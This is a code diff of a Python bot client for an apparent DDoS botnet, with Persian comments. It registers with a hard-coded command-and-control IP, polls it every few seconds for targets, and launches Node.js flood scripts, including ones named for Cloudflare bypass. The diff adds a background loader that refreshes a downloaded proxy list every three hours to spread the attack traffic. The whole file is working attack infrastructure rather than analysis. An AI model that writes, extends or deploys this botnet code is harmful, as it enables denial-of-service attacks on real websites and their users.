@@ -5,25 +5,46 @@ import uuid
 import subprocess
 import os
 import threading
+import logging
+
+# ========== LOGGING ==========
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s | %(levelname)-8s | %(message)s',
+    handlers=[logging.StreamHandler()]
+)
+logger = logging.getLogger("ZOMBIE")
 
 # ========== CONFIG ==========
-C2_URL = "http://46.101.241.66:8083"
+C2_URL = "http://46.101.241.66:8083"  # آدرس C2
+PROXY_URL = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt" # لینک پروکسی
 ZOMBIE_ID = str(uuid.uuid4())[:8]
-CHECK_INTERVAL = 5
+CHECK_INTERVAL = 5 # هر ۵ ثانیه به C2 سر میزنه
+PROXY_UPDATE_INTERVAL = 3 * 60 * 60 # هر ۳ ساعت (به ثانیه)
 
-# مسیر فایل‌های Node.js
-NODE_SCRIPTS = {
-    "TLS.js": "TLS.js",
-    "GOD.js": "GOD.js",
-    "UAM-BYPASS.js": "UAM-BYPASS.js",
-    "DESTROY.js": "DESTROY.js",
-    "HTTPS.js": "HTTPS.js",
-    "bypassUAM.js": "bypassUAM.js",
-    "CFBYPASS.js": "CFBYPASS.js"
-}
+running_attacks = {} 
 
-running_attacks = {}  # {attack_key: process}
+# ========== PROXY AUTO-UPDATER ==========
+def update_proxies():
+    logger.info("🔄 [PROXY] در حال آپدیت لیست پروکسی‌ها...")
+    try:
+        r = requests.get(PROXY_URL, timeout=15)
+        if r.status_code == 200:
+            # ذخیره در فایل proxy.txt
+            with open("proxy.txt", "w", encoding="utf-8") as f:
+                f.write(r.text)
+            logger.info(f"✅ [PROXY] {len(r.text.splitlines())} پروکسی جدید دانلود شد.")
+        else:
+            logger.warning(f"⚠️ [PROXY] خطا در دانلود (کد {r.status_code})")
+    except Exception as e:
+        logger.error(f"❌ [PROXY] خطا در ارتباط: {e}")
 
+def proxy_updater_loop():
+    while True:
+        update_proxies()
+        time.sleep(PROXY_UPDATE_INTERVAL)
+
+# ========== C2 COMMUNICATION ==========
 def get_public_ip():
     try:
         return requests.get('https://api.ipify.org', timeout=5).text
@@ -53,32 +74,21 @@ def heartbeat():
         pass
     return []
 
+# ========== ATTACK EXECUTION ==========
 def run_attack(cmd):
     target = cmd.get('target')
     t = cmd.get('time')
     power = cmd.get('power')
     
-    # محاسبه تعداد ترد بر اساس قدرت (1 تا 100)
+    # تنظیمات بر اساس قدرت (1 تا 100)
     threads = max(1, int(power / 10))
-    # تعداد ریکوئست در ثانیه
     rate = max(1, int(power))
     
-    # انتخاب اسکریپت بر اساس قدرت
-    if power > 70:
-        script = "UAM-BYPASS.js"
-    elif power > 40:
-        script = "TLS.js"
-    else:
-        script = "GOD.js"
-    
-    # اجرای دستور
+    # ⚠️ همیشه از TLS.js استفاده میکنیم
+    script = "TLS.js"
     cmd_line = ["node", script, target, str(t), str(rate), str(threads)]
     
-    # برای اسکریپت‌هایی که پروکسی لازم دارن
-    if script in ["UAM-BYPASS.js", "GOD.js", "TLS.js"]:
-        cmd_line.append("proxy.txt")
-    
-    print(f"[*] Starting attack: {' '.join(cmd_line)}")
+    logger.info(f"🚀 [ATTACK] Starting: {' '.join(cmd_line)}")
     
     try:
         proc = subprocess.Popen(cmd_line, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -86,27 +96,37 @@ def run_attack(cmd):
         running_attacks[key] = proc
         return key
     except Exception as e:
-        print(f"[-] Attack failed: {e}")
+        logger.error(f"❌ [ATTACK] Failed: {e}")
         return None
 
 def stop_all_attacks():
-    print("[*] Stopping all attacks...")
+    logger.info("🛑 [ATTACK] Stopping all attacks...")
     for key, proc in list(running_attacks.items()):
         try:
             proc.terminate()
-            print(f"[-] Stopped: {key}")
+            logger.info(f"[-] Stopped: {key}")
         except:
             pass
         del running_attacks[key]
 
+# ========== MAIN LOOP ==========
 if __name__ == "__main__":
-    print(f"[*] Zombie {ZOMBIE_ID} starting...")
+    logger.info(f"💀 Zombie {ZOMBIE_ID} starting...")
+    
+    # آپدیت اولیه پروکسی
+    update_proxies()
+    
+    # اجرای آپدیت پروکسی در پس‌زمینه (هر ۳ ساعت)
+    threading.Thread(target=proxy_updater_loop, daemon=True).start()
+    
+    # ثبت‌نام در C2
     while not register():
-        print("[-] Failed to register, retrying in 10s...")
+        logger.warning("[-] Failed to register, retrying in 10s...")
         time.sleep(10)
     
-    print("[+] Registered to C2.")
+    logger.info("[+] Registered to C2.")
     
+    # حلقه اصلی دریافت دستور
     while True:
         cmds = heartbeat()
         for cmd in cmds:
